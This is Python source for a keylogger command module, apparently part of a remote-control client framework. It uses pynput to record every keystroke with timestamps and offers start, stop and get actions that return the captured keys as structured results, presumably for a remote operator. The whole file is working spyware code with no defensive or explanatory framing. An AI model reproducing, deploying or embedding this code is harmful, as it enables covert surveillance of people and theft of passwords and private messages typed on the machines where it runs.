import logging
import threading
import time
from datetime import datetime
from typing import Any, Dict, List, Optional

from pynput import keyboard

from client.commands.base import BaseCommand

logger = logging.getLogger(__name__)


class KeyloggerCommand(BaseCommand):
    _instance: Optional["KeyloggerCommand"] = None
    _lock = threading.Lock()

    def __new__(cls) -> "KeyloggerCommand":
        with cls._lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
                cls._instance._initialized = False
            return cls._instance

    def __init__(self) -> None:
        if self._initialized:
            return
        self._initialized = True
        self._keystrokes: List[Dict[str, Any]] = []
        self._keystroke_lock = threading.Lock()
        self._listener: Optional[keyboard.Listener] = None
        self._listener_lock = threading.Lock()
        self._running = False

    @property
    def name(self) -> str:
        return "keylogger"

    @property
    def description(self) -> str:
        return "Record keystrokes"

    def execute(self, params: Dict[str, Any]) -> Dict[str, Any]:
        action = params.get("action", "").lower()

        if action == "start":
            return self._start()
        elif action == "stop":
            return self._stop()
        elif action == "get":
            return self._get_keystrokes()
        else:
            return self._error_response(
                f"Invalid action '{action}'. Use: start, stop, or get"
            )

    def _on_press(self, key: Any) -> None:
        try:
            timestamp = time.time()
            dt = datetime.fromtimestamp(timestamp)

            key_str: str
            if isinstance(key, keyboard.KeyCode):
                key_str = key.char if key.char else f"[KeyCode:{key.vk}]"
            elif isinstance(key, keyboard.Key):
                key_str = f"[{key.name}]"
            else:
                key_str = str(key)

            with self._keystroke_lock:
                self._keystrokes.append({
                    "timestamp": timestamp,
                    "datetime": dt.isoformat(),
                    "key": key_str,
                })

        except Exception as e:
            logger.error(f"Error capturing keystroke: {e}")

    def _start(self) -> Dict[str, Any]:
        with self._listener_lock:
            if self._running and self._listener is not None:
                return {
                    "success": True,
                    "status": "already_running",
                    "message": "Keylogger is already running",
                    "keystroke_count": self._get_keystroke_count(),
                }

            with self._keystroke_lock:
                self._keystrokes.clear()

            self._listener = keyboard.Listener(on_press=self._on_press)
            self._listener.start()
            self._running = True

            logger.info("Keylogger started")

            return {
                "success": True,
                "status": "started",
                "message": "Keylogger started successfully",
                "timestamp": time.time(),
            }

    def _stop(self) -> Dict[str, Any]:
        with self._listener_lock:
            if not self._running or self._listener is None:
                return {
                    "success": True,
                    "status": "not_running",
                    "message": "Keylogger was not running",
                    "keystroke_count": self._get_keystroke_count(),
                }

            self._listener.stop()
            self._listener = None
            self._running = False

            count = self._get_keystroke_count()
            logger.info(f"Keylogger stopped. Captured {count} keystrokes")

            return {
                "success": True,
                "status": "stopped",
                "message": f"Keylogger stopped. Captured {count} keystrokes",
                "keystroke_count": count,
            }

    def _get_keystrokes(self) -> Dict[str, Any]:
        with self._keystroke_lock:
            keystrokes = list(self._keystrokes)
            count = len(keystrokes)

        return {
            "success": True,
            "status": "running" if self._running else "stopped",
            "keystrokes": keystrokes,
            "count": count,
            "message": f"Retrieved {count} keystrokes",
        }

    def _get_keystroke_count(self) -> int:
        with self._keystroke_lock:
            return len(self._keystrokes)

    def _error_response(self, message: str) -> Dict[str, Any]:
        return {
            "success": False,
            "error": message,
        }
